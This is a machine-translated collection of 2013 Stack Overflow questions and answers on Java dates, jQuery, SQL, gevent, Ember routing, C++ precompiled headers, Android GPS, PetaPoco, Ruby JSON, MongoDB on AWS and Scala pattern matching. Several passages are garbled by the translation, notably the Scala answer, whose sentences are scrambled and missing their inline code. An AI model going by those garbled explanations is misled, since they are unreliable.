SimpleDateFormat dateFormatGmt = new SimpleDateFormat("yyyy-MMM-dd HH:mm:ss");
dateFormatGmt.setTimeZone(TimeZone.getTimeZone("GMT")); // don't change timezone
System.out.println(dateFormatGmt.format(date)); 
```

日期存储为自 1900 年 1 月 1 日以来的天数（[Excel 存储它们的方式](http://answers.oreilly.com/topic/1694-how-excel-stores-date-and-time-values/)），如您正确猜测的那样，从小端格式的[双精度浮点](http://en.wikipedia.org/wiki/Double-precision_floating-point_format)转换为十六进制。您在开头包含的`A4 01`可能不是日期的一部分。

您的日期存储在您发布的时区 (GMT-7) 中，而不是 UTC。

**笔记：**

如果它是某种其他浮点格式，例如 80 位扩展格式，它可能是数字的`A4 01` **一部分。**但鉴于你的 4 个例子都是一样的，我宁愿认为不是。

# jquery - 更改 Jquery 视差效果的方向

> ID：15163860
> 
> 赞同：0
> 
> 时间：2013-03-01T17:50:47.393
> 
> 标签：jquery, css, parallax

我正在使用一个简单的 Scrolldeck Jquery Parallax 效果来以不同的速度滚动元素，但是我在让元素从上到下移动时遇到了一些麻烦，在下面的示例中，您可以找到一只鞋子以不同的滚动速度从下到上移动.

我试图将css位置更改为负值，更改outerHight值，但我找不到过渡的端点，只有起点，也许这就是我无法实现这一点的原因。

我想做同样的事情，但在滚动页面时从上到下移动同一只鞋，正如我在许多网站上看到的那样，任何人都可以帮助我吗？

示例：http: [//johnpolacek.github.com/scrolldeck.js/decks/parallax/](http://johnpolacek.github.com/scrolldeck.js/decks/parallax/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T18:02:12.447

最好在[http://net.tutsplus.com/tutorials/html-css-techniques/simple-parallax-scrolling-technique/](http://net.tutsplus.com/tutorials/html-css-techniques/simple-parallax-scrolling-technique/)
上解释视差滚动 简单、快速和好的方法来实现该技术。

# sql - 具有 MAX Call_date_time 的 Contact_ID 的不同列表

> ID：15163862
> 
> 赞同：0
> 
> 时间：2013-03-01T17:50:53.717
> 
> 标签：sql, sql-server-2008, tsql

我有一张表格，我需要从中收集数据，格式如下。

```
USER_id|| Reason_ID || CALLDATETIME||
18164564          4     2013-02-25 00:05:25
18164564          2     2013-02-24 00:06:30
18164286          8     2013-01-19 15:35:16
18164286          1     2013-02-18 12:31:59 
```

表中还有其他列，但我觉得它们对于这个特定示例无关紧要。所以我需要一个包含 MAX (CALLDATETIME) 的所有 user_id 的列表，但我只需要 1 个 user_id 用于报告。当涉及到 distinct 和 group by 和 order by 语法时，我似乎总是有点困惑。

我看了一个较早的线程，但不太明白他们是如何得到结果的，他们的也是一个 MySQL 示例。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T18:04:55.927

如果您需要 reason_ID，您可以`GROUP BY`作为 CTE 执行，然后稍后加入 reason_id：

```
WITH max_cte AS
(
  select user_id, MAX(calldatetime) MaxCalldatetime
  from [tablename]
  group by user_id
)
SELECT max_cte.*, [tablename].reason_id
FROM max_cte
JOIN [tablename] 
  ON max_cte.user_id = [tablename].user_id
  AND max_cte.MaxCalldatetime = [tablename].Calldatetime 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:52:52.680

像这样的东西应该工作

```
selct user_id, max(calldatetime) maxcalldatetime
from yourtable
where whatever
group by user_id 
```

# python - 为什么 gevent 执行这个未加入的 greenlet？

> ID：15163863
> 
> 赞同：3
> 
> 时间：2013-03-01T17:50:55.797
> 
> 标签：python, multithreading, gevent, greenlets

代码：

```
import gevent
import time

def func(a, t):
  time.sleep(t)
  print "got here", a

gevent.spawn(func, 'a', 4)
gevent.spawn(func, 'b', 0).join()
time.sleep(3)
print "exit" 
```

输出：

```
got here a
got here b
exit 
```

期待：

我从来没有加入第一个greenlet，所以我希望它永远不会执行；或者，考虑到长时间的 sleep()，它应该在第二个 greenlet 之后完成。

语境：

我希望能够启动一个“一次性”greenlet，它填充一个我从不加入的缓存，我也不想阻止等待结果。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T17:58:52.790

这是因为`time.sleep()`不是 gevent-aware，所以当`join()`被调用时，执行流程将是：

1.  `gevent.spawn(a)`— 将“spawn a”操作推入事件队列
2.  `gevent.spawn(b)`— 将“spawn b”操作推入事件队列
3.  `.join()`— 导致主线程让出并执行事件队列中的下一个事件（在这种情况下，`a`）
4.  `a`执行`time.sleep(4)`，阻塞整个进程 4 秒（但线程`a`不屈服，因为`time.sleep()`不支持 gevent）
5.  `a`终止并执行事件队列中的下一个事件（在这种情况下，`b`）
6.  `b`执行并终止，并执行队列中的下一个事件（在这种情况下，跳回主线程，导致`.join()`返回）

使用[gevent.monkey](http://www.gevent.org/gevent.monkey.html)或`gevent.sleep()`按您的预期查看此执行。

# jquery - jQuery - 单击时更改图像（简化功能）

> ID：15163867
> 
> 赞同：0
> 
> 时间：2013-03-01T17:51:17.727
> 
> 标签：jquery, image, getelementbyid

我创建了一个迷你演示，用于在点击时更改图像。以为我可以得到一些反馈，看看我如何最小化/清理代码。不要介意图像大小，它们是 FPO。图像加载也有轻微的滞后。如何将预加载器集成到此示例中？

我不认为这是实现我想要实现的目标的最佳解决方案。有人有类似的资源可以指点我吗？

[http://jsfiddle.net/mJ7Wc/](http://jsfiddle.net/mJ7Wc/)

```
$(document).ready (function () {
    $('#wheel1').click (function () {
        document.getElementById('changeBack').src='http://placehold.it/50x50';
        document.getElementById('changeFront').src='http://placehold.it/50x50';
    });
    $('#wheel2').click (function () {
        document.getElementById('changeBack').src='http://placehold.it/30x30';
        document.getElementById('changeFront').src='http://placehold.it/30x30';
    });
 $('#wheel3').click (function () {
        document.getElementById('changeBack').src='http://placehold.it/60x60';
     document.getElementById('changeFront').src='http://placehold.it/60x60';
    });
    $('#wheel4').click (function () {
        document.getElementById('changeBack').src='http://placehold.it/80x80';
        document.getElementById('changeFront').src='http://placehold.it/80x80';
    });
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:56:17.437

给你几个选择。

### 1.使用地图：

*（见下面的注释。）*

```
$(document).ready (function () {
    var images = {
        wheel1: {
            front: 'http://placehold.it/50x50',
            back:  'http://placehold.it/50x50'
        },
        wheel2: {
            front: 'http://placehold.it/30x30',
            back:  'http://placehold.it/30x30'
        },
        wheel3: {
            front: 'http://placehold.it/60x60',
            back:  'http://placehold.it/60x60'
        },
        wheel4: {
            front: 'http://placehold.it/80x80',
            back:  'http://placehold.it/80x80'
        }
    };

    $(".wheels").click(function() {
        var entry = images[this.id];
        if (entry) {
            $('#changeFront')[0].src = entry.front;
            $('#changeBack')[0].src  = entry.back;
        }
    }
}); 
```

对此有两点说明：

1.  我已经完成了更复杂的事情，即在正面和背面使用单独的图像，以防万一你的意思是这样；没有立即明白为什么我们要重复相同的图像两次。如果您真的想两次使用相同的图像，只需将`wheelX`条目设为实际路径，而不是使用`front`and的对象`back`。

2.  我已经包含了完整路径以防万一。如果它没有变化，当然将不变位移动到函数中，并`50x50`在地图中包含 or 或任何内容。

### 2.`data-*`在元素上使用属性。

```
$(document).ready (function () {
    $(".wheels").click(function() {
        var $this = (this);
        $('#changeFront')[0].src = $this.attr("data-front");
        $('#changeBack')[0].src  = $this.attr("data-back");
    }
}); 
```

...您的轮子在标记中指定图像的位置：

```
<div id="wheel1" class="wheels" data-front="http://placehold.it/50x50" data-back="http://placehold.it/50x50"> 
```

...并且上面相同的两个注释适用于此。

# ember.js - 在浏览器后退按钮单击时，嵌套路由渲染到相同的模板/插座中断

> ID：15163869
> 
> 赞同：13
> 
> 时间：2013-03-01T17:51:27.467
> 
> 标签：ember.js, ember-router

我有一个嵌套的路由层次结构，我的应用程序需要它来跟踪用户模型选择。我正在尝试使用主应用程序模板并将每个路由呈现到该模板上的单个插座中。这在我从父级到子级遍历路由层次结构时起作用。

但是，一旦您单击浏览器后退按钮以返回路由层次结构，父路由 renderTemplate 挂钩就不会触发。这会导致孩子从插座上脱钩，并且没有任何东西返回到插座中。

这是一个例子：

```
App = Ember.Application.create({});

App.Router.map(function(){
    this.resource("animals", function(){
        this.resource("pets", function(){
              this.route('new')
        })
    })
});
App.PetsView = Ember.View.extend({
    templateName : 'wild/pets'
});
App.AnimalsRoute = Ember.Route.extend({
     renderTemplate: function() {
    this.render({
    into: "application",
    outlet : "A"
})
     }});
App.PetsRoute = Ember.Route.extend({
     renderTemplate: function() {
this.render({
    into: "application",
    outlet : "A"
})}});

App.PetsNewRoute = Ember.Route.extend({
     renderTemplate: function() {
this.render({
    into: "application",
    outlet : "A"
})}}); 
```

使用模板：

```
<script type="text/x-handlebars" data-template-name="application">
    <h1>{{#linkTo "animals"}}Hello from Ember.js</h1>{{/linkTo}}
      {{outlet A}}
</script>

<script type="text/x-handlebars" data-template-name="animals">
    {{#linkTo "pets"}}This is animals list{{/linkTo}}
</script>
<script type="text/x-handlebars" data-template-name="wild/pets">
    {{#linkTo "pets.new"}}This is pets list{{/linkTo}}
</script>

<script type="text/x-handlebars" data-template-name="pets/new">
    This is pet creation
</script> 
```

这是一个带有这段代码的jsfiddle。单击链接以遍历路线，然后单击浏览器后退按钮，应用程序模板被渲染，没有任何东西连接到它的出口。

[http://jsfiddle.net/Wq6Df/3/](http://jsfiddle.net/Wq6Df/3/)

有没有办法强制重新渲染，或者我是不是走错了路？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2013-03-11T02:49:11.680

你的做法是错误的。

Ember 依赖于与路由层次结构匹配的嵌套出口层次结构。因此，每次您单击将您带到子路由的链接时，子路由都应呈现到其父模板中的插座中。如果您总是渲染到相同的模板和插座，那么当您向上移动路由层次结构时，Ember 将无法正确更新插座。（我希望这是有道理的。）

为避免此问题，一个好的经验法则是仅使用`into`用于呈现您在路由层次结构之外管理的模板的选项。例如，我使用它来呈现没有 URL 并且我手动拆除的模式视图。在视图层次结构中，您几乎总是可以避免使用`into`. 例如，如果您需要使用单独的控制器渲染多个模板，则可以在模板中使用帮助程序，而不是在路由`{{render}}`中调用。`render`

在这种情况下，最简单的解决方案可能是将路由嵌套与模板嵌套匹配。你的`animals/index`路线 和`pets`真的是兄弟姐妹，而不是父子，`pets/list`和你的`pets/new`. 事实上，这是默认但有些隐藏的行为：您应该真正使用`pets/index`来呈现列表而不是父`pets`路由。

```
App = Ember.Application.create({});

App.Router.map(function(){
    this.resource("animals", function(){
        // this.route("index"); at path /animals is implicit
        this.resource("pets", function(){
              // this.route("index"); at path /animals/pets is implicit
              this.route("new")
        })
    })
});

// You don't really need any of these route definitions now;
// I'm including them for clarity
App.AnimalsRoute = Ember.Route.extend();
App.AnimalsIndexRoute = Ember.Route.extend();

App.PetsRoute = Ember.Route.extend();
App.PetsIndexRoute = Ember.Route.extend();
App.PetsNewRoute = Ember.Route.extend();

// Not sure why you need to use a custom template name here, 
// but it should work fine
App.PetsView = Ember.View.extend({
    templateName : 'wild/pets'
}); 
```

使用模板：

```
<!-- animals gets rendered into this outlet -->
<script type="text/x-handlebars" data-template-name="application">
    <h1>{{#linkTo "animals"}}Hello from Ember.js</h1>{{/linkTo}}
    {{outlet}}
</script>

<!-- animals/index and pets get rendered into this outlet -->
<script type="text/x-handlebars" data-template-name="animals">
    {{outlet}}
</script>

<!-- no outlet here because animals/index has no child routes -->
<script type="text/x-handlebars" data-template-name="animals/index">
    {{#linkTo "pets"}}This is animals list{{/linkTo}}
</script>

<!-- pets/index and pets/new get rendered into this outlet -->
<script type="text/x-handlebars" data-template-name="wild/pets">
    {{outlet}}
</script>

<script type="text/x-handlebars" data-template-name="pets/index">
    {{#linkTo "pets.new"}}This is pets list{{/linkTo}}
</script>

<script type="text/x-handlebars" data-template-name="pets/new">
    This is pet creation
</script> 
```

# c++ - 使用 boost 库的预编译头文件需要很长时间才能编译

> ID：15163873
> 
> 赞同：1
> 
> 时间：2013-03-01T17:51:32.410
> 
> 标签：c++

我正在创建一个依赖于大量 boost 库的软件，并且随着编译变得越来越慢（几分钟），我已经将所有反复使用的库打包在一个预编译的头文件中（比如 20-ish boost 库和 20标准库），希望它能解决问题。

今天，我意识到当我使用预编译头编译时，一个普通的 hello-world.cpp（甚至不包括该死的预编译头）需要 15 秒才能构建。预编译头是300MB左右。

因此，问题是：

- 对于这种大小的预编译头文件，这种减速是预期的吗？（我暗中希望我犯了某种可怕的错误，如果你们中的一个人能告诉我他经常使用 2GB 预编译头文件并且事情很顺利，我会非常高兴）

- 如果预计会出现这种减速，那么我根本不相信预编译头文件的有用性。我错过了什么吗？

编译器：

```
gcc version 4.4.5 (Debian 4.4.5-8) 
```

命令行：

```
g++ -include common-header.hpp -Winvalid-pch -c vanilla-hello-world.cpp 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:56:10.717

> 将所有反复使用的库打包在一个预编译的头文件中

这是您的问题，只需包含您需要的内容。

每个 TU 仍然必须查阅这个庞大的预压缩标头。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T18:20:42.677

vanilla_hello_world.cpp 文件应该以预编译头文件的#include 开头（在除注释之外的任何其他 C++ 语句之前。

您的问题应包括使用的命令行和由以下人员生成的控制台消息：

1.  编译 PCH 的命令
2.  在没有 PCH 的情况下编译 vanilla_hello_world.cpp 的命令
3.  使用 PCH 编译 vanilla_hello_world.cpp 的命令。

使用“time gcc ...”显示上述各项的时间。

如果 PCH 正在工作，则时间 #3 将小于时间 #2。

时间#1 + 时间#2 很可能大于#3。PCH 的要点是#1 很少需要（通常只需要一次）。

# c# - 如何从数据集中读取 int 值？在 C# 中

> ID：15163874
> 
> 赞同：-5
> 
> 时间：2013-03-01T17:51:35.267
> 
> 标签：c#, sql, dataset

如果我有一个返回 DataSet 的函数，它有 1 行带有 int 值。

我如何读取该 int 值？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-01T17:53:01.247

为什么将数据集用于单个静态值。如果您使用的是 sql reader，请使用 ExecuteScalar 函数

例子：

```
function GetIntValue()
{
SqlConnection con = new SqlConnection(ConfigurationSettings.AppSettings["con"]);

    con.Open();

    SqlCommand cmdCount = new SqlCommand("SELECT COUNT(*) FROM Employees",con);
    int numberOfEmployees = (int)cmdCount.ExecuteScalar();
    Response.Write("Here are the " + numberOfEmployees.ToString() + " employees: <br><br>");

    SqlCommand cmd = new SqlCommand("SELECT * FROM Employees",con);
    SqlDataReader dr = cmd.ExecuteReader();
    while(dr.Read()) {
        Response.Write(dr["LastName"] + "<br>");
    }
    con.Close();
} 
```

# android - 在 Android 中定期获取 GPS

> ID：15163882
> 
> 赞同：0
> 
> 时间：2013-03-01T17:52:05.917
> 
> 标签：android, gps

好的，在android中有一个关于GPS的问题。几天我尝试创建代码，它会每 20 秒检测一次位置（经度、纬度），然后它将此信息发送到服务器。但这个问题与发送数据无关。

我有几个想法和建议，我已经阅读了一堆或教程如何在循环中创建拾取坐标：

1.  在`activity`, 使用`LocationListener`
2.  `IntentService`

但是：使用`LocationListener`，我确实可以使用`onLocationChanged()`方法获取坐标，问题是它是一个`Activity`，所以我假设如果屏幕关闭或有人打电话，收集坐标将停止。

使用`IntentService`and `locationManager.getLastKnownLocation(provider)`- 这似乎很棒，因为它在它自己的线程中运行，但是在一个循环中（它必须在那里，因为我们想在间隔中选择坐标）这个代码不起作用：

```
 lat = location.getLatitude();
      lon = location.getLongitude(); 
```

它只在第一次工作，之后，坐标保持不变（我也尝试过重新声明`LocationManager`，它没有改变）。在我看来，获取坐标是不必要的复杂。

我的问题是：我错过了什么/我做错了吗？感谢您的帮助，我感谢每一个有用的建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T18:07:09.387

我建议使用[服务](https://developer.android.com/reference/android/app/Service.html)而不是 IntentService。IntentServices 在完成代码后立即退出`onHandleIntent()`，无论是否有任何回调已经返回数据。同样创建一个循环来重复轮询`getLastKnownLocation()`是获取位置更新的一种非常低效的方法，即使在单独的线程上也是如此。更好的方法是将[LocationListener](https://developer.android.com/reference/android/location/LocationListener.html)传递给`requestLocationUpdates()`，从而将 CPU 从阻塞循环的繁忙工作中解放出来。

请注意，服务默认情况下*不会*在自己的线程上运行，您需要自己执行此操作。我建议使用[HandlerThread](https://developer.android.com/reference/android/os/HandlerThread.html)因为`requestLocationUpdates()`需要 Looper 才能正常运行。

* * *

从[IntentService](https://developer.android.com/reference/android/app/IntentService.html)的文档中：

> IntentService 是按需处理异步请求（表示为 Intent）的服务的基类。客户端通过 startService(Intent) 调用发送请求；该服务根据需要启动，使用工作线程依次处理每个 Intent，并在工作结束时自行停止。

从[Service](https://developer.android.com/reference/android/app/Service.html#WhatIsAService)的文档中：

> 关于 Service 类的大多数混淆实际上都围绕着它*不是*什么：
> 
> *   服务**不是**一个单独的进程。Service 对象本身并不意味着它在自己的进程中运行；除非另有说明，否则它在与其所属的应用程序相同的进程中运行。
> *   服务**不是**线程。它本身并不是一种脱离主线程工作的方法（以避免应用程序无响应错误）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T18:06:24.780

我想我不太明白你在说什么。据我所知，[Location Strategies](http://developer.android.com/guide/topics/location/strategies.html)文档和[LocationListener](http://developer.android.com/reference/android/location/LocationListener.html)文档都没有说明必须将其作为活动来实现。据我了解（并且实际上已经使用它），LocationListener 是异步的：它会不时为您提供有关您的位置的新信息。这取决于你如何使用它。

我要做的是：在服务开始时创建一个 LocationListener 并定期检查其信息是否已更改。我链接到的第一个文档很好地解释了如何使用它。

# c# - PetoPoco ExecuteScalar - 不存在数据时尝试读取无效

> ID：15163886
> 
> 赞同：1
> 
> 时间：2013-03-01T17:52:15.043
> 
> 标签：c#, stored-procedures, dotnetnuke, petapoco

我正在使用 Charles Nurse 在他的博客 [http://www.charlesnurse.com/Blog/tabid/226/EntryId/69/DAL-2-DataContext-Deep-Dive.aspx](http://www.charlesnurse.com/Blog/tabid/226/EntryId/69/DAL-2-DataContext-Deep-Dive.aspx)中概述的 DotNetNuke 7 的 DAL2 并且遇到过使用 ExecuteScalar 时出现意外错误。

我的存储过程触发并插入到数据库中，但总体而言，代码错误是“不存在数据时读取的尝试无效。”。我已经看到了与数据阅读器相关的这个错误，尽管在我的例子中我使用了 DotNetNuke 的 PetaPoco 集成。任何见解都非常感谢。这是代码

```
public int AddLocation(string LocationType, string Name, string Description, string Address, string AreaCode, string Telephone, int Capacity, float Long, float Lat)
        {
            int id;
            using (IDataContext db = DataContext.Instance())
            {

                id = db.ExecuteScalar<int>(CommandType.StoredProcedure,
                    "CP_AddLocation", LocationType, Name, Description, Address, AreaCode, Telephone, Capacity, Long, Lat);
            }
            return id;
        } 
```

还有我的存储过程。它自己工作并返回最新的 ID。我应该提到一些我注意到并发现奇怪的是，如果我将参数声明为输出参数，即@LocationId int OUTPUT，那么 addLocation() 方法不起作用，并且出现类似“预期参数@LocationId”的错误。

```
CREATE PROCEDURE [dbo].[CP_AddLocation]
 @locationType nvarchar(100),
 @name nvarchar(100),
 @description nvarchar(200),
 @address nvarchar(250),
 @areaCode nvarchar(50),
 @telephone nvarchar(50),
 @capacity int,
 @long float,
 @lat float

AS

DECLARE @geoCode geography
SET @geoCode = geography:: STGeomFromText('POINT (' + CAST(@long AS varchar) + ' ' + CAST(@lat AS varchar) + ')',4326);
BEGIN
INSERT INTO CP_Locations(
    LocationType,
    Name,
    Description,
    Address,
    AreaCode,
    Telephone,
    GeoCode,
    Capacity,
    Long,
    Lat)
    VALUES(
    @locationType,
    @name,
    @description,
    @address,
    @areaCode,
    @telephone,
    @geoCode,
    @capacity,
    @long,
    @lat)
END
declare @locationId int;
select @locationId = SCOPE_IDENTITY()
return @locationId; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-02T05:46:54.137

执行标量需要选择值，因为它从结果集的第一行和第一列获取值。

因此，只需将存储过程的最后 3 行替换为

```
SELECT SCOPE_IDENTITY() 
```

你将被设置！

# python - 在python中通过网络发送函数指针

> ID：15163887
> 
> 赞同：4
> 
> 时间：2013-03-01T17:52:25.247
> 
> 标签：python, function, networking, pointers, distributed

是否有可能通过网络在 python 中发送函数指针以在另一台机器上运行？

假设我有一个要运行的函数：

```
def myFunc():
  ... 
```

是否可以使用函数指针将 myFunc 发送到另一台机器，或者函数指针仅在本地可用？如果这是不可能的，我还有什么其他选择？发送 python 文件？

我对网络在 python 中的工作方式不感兴趣，因为该部分已经完全实现。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T18:07:46.500

开箱即用并不容易。您需要远程计算机上的 .py 文件。但是你可以用[Python fabric](http://fabfile.org)来做。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T18:16:56.360

您是否考虑过腌制您的功能并通过网络发送？

示例（服务器）：

```
import pickle

def test1():        #Function to be send
    return True

with open('data.pickle', 'wb') as f:    #On server you pickling function
    pickle.dump(test1.__code__, f) 
```

示例（客户）：

```
import pickle
import types

with open('data.pickle', 'rb') as f:    #On client you load and unpickle function
    code = pickle.load(f)

test2 = types.FunctionType(code, globals())

print(test2())    #Result will be True 
```

注意：请注意通过网络发送代码时可能出现的安全问题。

# ruby - 奇怪的 JSON 行为？

> ID：15163888
> 
> 赞同：2
> 
> 时间：2013-03-01T17:52:24.927
> 
> 标签：ruby, json

我正在尝试将对象转换为 JSON，然后再次解析它。问题是，当我解析 JSON 字符串时，我留下了一个 Hash 而不是我的原始对象。[我在json.rubyforge.com](http://flori.github.com/json/)找到了这个简单的示例并尝试了它：

```
require 'json'

class Range
  def to_json(*a)
    {
      'json_class'   => self.class.name,
      'data'         => [ first, last, exclude_end? ]
    }.to_json(*a)
  end

  def self.json_create(o)
    new(*o['data'])
  end
end

puts JSON.parse((1..10).to_json) == (1..10) 
```

它也失败了，返回`false`. 进一步看，似乎没有`json_create`被调用。

在这一点上，我想我必须遗漏一些非常简单的东西，或者我在某个地方遇到了错误。我正在使用 Ruby 1.9.3。有人有想法么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-01T19:41:41.080

p392 中的这种行为变化是由于[安全修复](https://github.com/flori/json/commit/d0a62f3ced7560daba2ad546d83f0479a5ae2cf2)。有关详细信息，请参阅[p392 发布公告](http://www.ruby-lang.org/en/news/2013/02/22/json-dos-cve-2013-0269/)。

您的代码`:create_additions`可以在您的调用中添加选项`JSON.parse`：

```
require 'json'

class Range
  def to_json(*a)
    {
      'json_class'   => self.class.name,
      'data'         => [ first, last, exclude_end? ]
    }.to_json(*a)
  end

  def self.json_create(o)
    new(*o['data'])
  end
end

puts JSON.parse((1..10).to_json, :create_additions => true) == (1..10) 
```

# php - 无法连接到托管在不同服务器上的 MongoDB - PHP

> ID：15163889
> 
> 赞同：2
> 
> 时间：2013-03-01T17:52:27.733
> 
> 标签：php, mongodb, amazon-web-services, amazon-ec2, cloud

我创建了两个 AWS 实例，并为它们分配了两个不同的弹性 IP。一个实例用于数据库服务器（托管在 MongoDB 中），而另一个实例用于托管网站。

我无法通过我的 PHP 代码连接到服务器。我的代码如下所示：

```
try{
    $connection = new Mongo('mongodb://107.21.230.121:27017');
}
    catch (MongoConnectionException $exception)
{
    print_r($exception->getMessage());
} 
```

当我在我的网站上运行此代码时，我收到以下错误：

> “无法连接到：107.21.230.121:27017：0 毫秒后超时。”

我检查了运行 MongoDB 的服务器。使用 Mongo shell，我还能够创建一些集合和文档。

尝试了各种策略都没有成功。有人可以建议我在哪里设置错误吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T18:46:58.297

从对您的实例的快速而肮脏的 nmap 扫描来看，您似乎没有在安全组中打开端口 (27017)。这需要在端口服务器上完成。

# ruby-on-rails - Rails 模板中的 Ruby 枚举器

> ID：15163895
> 
> 赞同：3
> 
> 时间：2013-03-01T17:52:51.480
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.1, ruby-on-rails-3.2

```
<ul>
<% for file in @files %>
 <li><%= file %></li>
<% end %>
</ul> 
```

输出 ：

*   文件 1*   文件2

    但如果我想使用枚举器：

    ```
    <% @files.each{|file| file} %> 
    ```

    输出：['file1'，'file2']

    我无法将输出作为 <\li> 列表。

    我的问题是是否可以使用枚举获取列表输出？如果有怎么办？？我是rails的初学者。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T17:55:45.103

```
<% @files.each do |file| %>
  <li><%= file %></li>
<% end %> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-01T18:18:50.377

为了一个班轮，你可以这样做：

```
<%=raw @files.map {|file| content_tag(:li, file)}.join %>

#mix
<% @files.each do |file| %> <%= content_tag(:li, file) %> <% end %> 
```

但***真的***，**不要**！

# objective-c - 推送 DetailViewController 和 UITableView 的问题

> ID：15163899
> 
> 赞同：1
> 
> 时间：2013-03-01T17:52:56.890
> 
> 标签：objective-c, uitableview, segue, viewdidload

**更新**

```
DetailViewController *wordDetail = [[DetailViewController alloc] initWithNibName:@"DetailViewController" bundle:nil];
wordDetail.wordWordString = [[NSString alloc] initWithString:[[myArray objectAtIndex:indexPath.row] objectForKey:@"word"]];
wordDetail.wordDefinitionString = [[NSString alloc] initWithString:[[myArray objectAtIndex:indexPath.row] objectForKey:@"definition"]];
wordDetail.title = [[myArray objectAtIndex:indexPath.row] objectForKey:@"name"];

[self performSegueWithIdentifier:@"showDetail" sender:self]; 
```

这是我为 segue 做的新准备（你的意思是如果我使用上述方法，我就不再需要它了，还是根本不需要？我现在确定我的所有标识符是否都在排队......你觉得呢？

```
-(void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
if ([[showDetail] isEqualToString:@"showDetail"]) {
NSIndexPath *indexPath = [self.tableView indexPathForSelectedRow];
NSDate *object = _objects[indexPath.row];
[[segue destinationViewController] setDetailItem:object]; 
```

图它也可能有助于查看我的 DetailViewController.m ......

```
-(void)setDetailItem:(id)newDetailItem
{
if (_detailItem != newDetailItem) {
    _detailItem = newDetailItem;

    // Update the view.
    [self configureView];
}

if (self.masterPopoverController != nil) {
    [self.masterPopoverController dismissPopoverAnimated:YES];
}        
}

-(void)configureView
{
//Update the user interface for the detail item.

if (self.detailItem) {
    self.detailDescriptionLabel.text = [self.detailItem description];
}
}

- (void)viewDidLoad
{
    wordWordLabel.text = wordWordString;
    wordDefinitionLabel.text = wordDefinitionString;

    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
    [self configureView];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T18:24:28.480

您的第一部分代码很好。然而，它正在创建一个 DetailViewController 然后推动它。这意味着永远不会有 Segue，因此您的第二个代码根本不重要。您需要决定要使用哪个。

```
[self.navigationController pushViewController:wordDetail animated:YES]; 
```

此行将 viewController 推入堆栈。或者

```
[self performSegueWithIdentifier:@"showDetail sender:self]; 
```

将在 Storyboard 中使用名为 showDetail 的 segue。你不能两者兼得，你需要选择。

**故事板标识符** ![故事板标识符](../Images/6e5e72e2371d8067f37f453f5942c8f9.png)

# scala - Scala 模式匹配与集合

> ID：15163904
> 
> 赞同：18
> 
> 时间：2013-03-01T17:53:14.817
> 
> 标签：scala, pattern-matching

以下不起作用。

```
object Foo {
    def union(s: Set[Int], t: Set[Int]): Set[Int] = t match {
        case isEmpty => s
        case (x:xs)  => union(s + x, xs)
        case _       => throw new Error("bad input")
    }
} 
```

> 错误：未找到：输入 xs

如何在一组上进行模式匹配？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-03-01T21:44:24.343

好吧，type 的`x:xs`手段，所以它不起作用。但是，唉，你不能对集合进行模式匹配，因为集合没有定义的顺序。或者，更务实的是，因为.`x``xs``Set`

但是，您始终可以定义自己的：

```
object SetExtractor {
  def unapplySeq[T](s: Set[T]): Option[Seq[T]] = Some(s.toSeq)
} 
```

例如：

```
scala> Set(1, 2, 3) match {
     |   case SetExtractor(x, xs @ _*) => println(s"x: $x\nxs: $xs")
     | }
x: 1
xs: ArrayBuffer(2, 3) 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-03-01T18:02:16.420

`Set`不是一个`case class`也没有一个`unapply`方法。

这两件事意味着您不能直接在 a 上进行模式匹配`Set`。
（**更新**：除非您为 定义自己的*提取器*，`Set`正如丹尼尔在他的回答中正确显示的那样）

你应该找到一个替代方案，我建议使用折叠功能

```
def union(s: Set[Int], t: Set[Int]): Set[Int] = 
    (s foldLeft t) {case (t: Set[Int], x: Int) => t + x} 
```

或者，避免最显式的类型注释

```
def union(s: Set[Int], t: Set[Int]): Set[Int] =
  (s foldLeft t)( (union, element) => union + element ) 
```

甚至更短

```
def union(s: Set[Int], t: Set[Int]): Set[Int] =
  (s foldLeft t)(_ + _) 
```

这将累积`s`over的元素`t`，将它们一一添加

* * *

**折叠式的**

以下是折叠操作的[文档](http://www.scala-lang.org/api/current/index.html#scala.collection.Set)，如果需要参考：

```
foldLeft[B](z: B)(op: (B, A) ⇒ B): B 
```

将二元运算符应用于起始值和该集合的所有元素，从左到右。

注意：可能会针对不同的运行返回不同的结果，除非对基础集合类型进行了排序。或运算符是关联和可交换的。

```
B the result type of the binary operator.
z the start value.
op the binary operator.
returns the result of inserting op between consecutive elements of this set, going left to right with the start value z on the left:

op(...op(z, x_1), x_2, ..., x_n)
where x1, ..., xn are the elements of this set. 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-03-01T17:59:45.083

首先，你`isEmpty`会抓住每一个`Set`，因为它在这种情况下是一个变量。常量在 Scala 中以大写字母开头，并且仅在此条件成立时才被视为常量。所以小写将分配任何`Set`给`isEmpty`（你在找`EmptySet`吗？）

[如此处](http://www.scala-lang.org/node/6252)所见，似乎模式匹配对于`Set`s 不是很可取。您可能应该将 显式转换`Set`为 a`List`或`Seq`( `toList`/ `toSeq`)

```
object Foo {
    def union(s: Set[Int], t: Set[Int]): Set[Int] = t.toList match {
        case Nil => s
